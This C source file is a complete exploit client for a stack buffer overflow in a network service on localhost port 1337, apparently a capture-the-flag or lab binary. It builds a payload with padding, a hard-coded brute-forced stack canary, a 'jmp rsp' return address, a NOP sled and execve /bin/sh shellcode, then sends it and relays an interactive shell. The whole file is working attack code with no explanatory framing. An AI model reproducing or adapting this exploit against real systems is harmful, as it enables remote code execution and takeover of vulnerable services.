#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};

    // 1. Connection
    sock = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1337);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connect failed");
        return -1;
    }

    // 2. Read "Length: "
    read(sock, buffer, 8);

    // 3. Prepare Payload
    // Offset(40) + Canary(8) + RBP(8) + RIP(8) + NOPs(16) + Shellcode(27)
    unsigned char payload[107]; 
    memset(payload, 'A', 40);

    // Your Brute-forced Canary (Little Endian)
    // 0092e78784a0f019
    unsigned char canary[] = {0x00, 0x92, 0xe7, 0x87, 0x84, 0xa0, 0xf0, 0x19};
    memcpy(payload + 40, canary, 8);

    // Saved RBP junk
    memset(payload + 48, 'B', 8);

    // RIP = 0x40146f (jmp rsp)
    unsigned long jmp_rsp = 0x40146f;
    memcpy(payload + 56, &jmp_rsp, 8);

    // NOP Sled
    memset(payload + 64, 0x90, 16);

    // Execve /bin/sh Shellcode
    unsigned char shellcode[] = 
        "\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x04\x00\x00\x00"
        "\x04\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68";
    memcpy(payload + 80, shellcode, 27);

    // 4. Send Length
    int total_len = sizeof(payload);
    write(sock, &total_len, 4);

    // Wait for the server to say "Going to read..."
    usleep(100000);

    // 5. Send Payload
    write(sock, payload, total_len);
    printf("[+] Payload sent. Entering interactive session...\n");

    // 6. Interactive Shell (Pass-through)
    // This allows you to type commands into the socket
    fd_set fds;
    while (1) {
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(sock, &fds);
        select(sock + 1, &fds, NULL, NULL, NULL);

        if (FD_ISSET(0, &fds)) {
            int n = read(0, buffer, sizeof(buffer));
            write(sock, buffer, n);
        }
        if (FD_ISSET(sock, &fds)) {
            int n = read(sock, buffer, sizeof(buffer));
            if (n <= 0) break;
            write(1, buffer, n);
        }
    }

    close(sock);
    return 0;
}
